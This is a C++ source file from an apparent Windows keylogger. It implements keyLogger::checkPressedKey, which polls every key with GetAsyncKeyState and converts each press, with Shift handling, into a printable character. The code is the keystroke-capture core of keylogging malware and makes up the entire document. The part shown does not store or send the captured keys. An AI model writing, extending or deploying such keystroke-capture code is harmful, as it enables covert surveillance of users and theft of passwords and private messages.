#include "keyLogger.h"

/*
A function that checks if a key was pressed and returns a printable key.
If no printable character was pressed, it will return 0.
*/

char keyLogger::checkPressedKey()
{
    int keyStat = 0;    // Can be 0 if not pressed, 0x1 if pressed and 0x8000 if held.
    char keyChar = 0;   // Printable character.

    for (int i = 0; i < NUM_OF_KEYS; i++)
    {
        keyStat = GetAsyncKeyState(i);

        // Check if a key was pressed with Shift.
        if ((keyStat & 0x1) && GetAsyncKeyState(VK_SHIFT) && i != VK_SHIFT && i != VK_RSHIFT && i != VK_LSHIFT)
        {
            keyChar = keyProcessor::filterPrintableChar((char)MapVirtualKey(i, MAPVK_VK_TO_CHAR));
            keyChar = keyProcessor::formatShiftedKeys(keyChar);
            i = NUM_OF_KEYS;
        }
        else if (keyStat & 0x1) // Check if a key was pressed without Shift.
        {
            keyChar = keyProcessor::filterPrintableChar((char)MapVirtualKey(i, MAPVK_VK_TO_CHAR));

            // Letters are capital by default, convert them to lower case.
            if (keyChar >= 'A' && keyChar <= 'Z')   
                keyChar = keyProcessor::convertToLowerCase(keyChar);

            i = NUM_OF_KEYS;
        }

    }

    return keyChar;
}
